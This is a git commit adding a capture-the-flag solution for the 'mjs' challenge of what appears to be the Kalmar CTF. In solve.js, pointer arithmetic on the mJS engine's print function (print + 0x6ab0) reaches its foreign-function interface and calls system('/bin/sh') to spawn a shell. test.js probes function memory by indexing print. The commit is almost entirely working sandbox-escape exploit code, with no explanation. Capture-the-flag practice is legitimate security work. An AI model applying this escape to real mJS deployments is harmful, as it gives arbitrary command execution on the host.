7bb6eb0e677b00f677a55a3181255731110885a1
Jordi <sroot079@gmail.com>
2023-03-08 18:25:04 -0500

    change directory name

---
+++ CTF/kalmar/mjs/solve.js
@@ -0,0 +1,3 @@
+// let system = ffi('int system(char *)');
+// system('/bin/sh');
+print((print + 0x6ab0)('int system(char *)')('/bin/sh'));
---
+++ CTF/kalmar/mjs/test.js
@@ -0,0 +1,13 @@
+function hello() {
+    print("hello world");
+}
+
+hello();
+
+// (print + 1)[0] = 5;
+print((print + 1)[0]);
+print(print[1]);
+print(print[2]);
+print(print[3]);
+
+1;
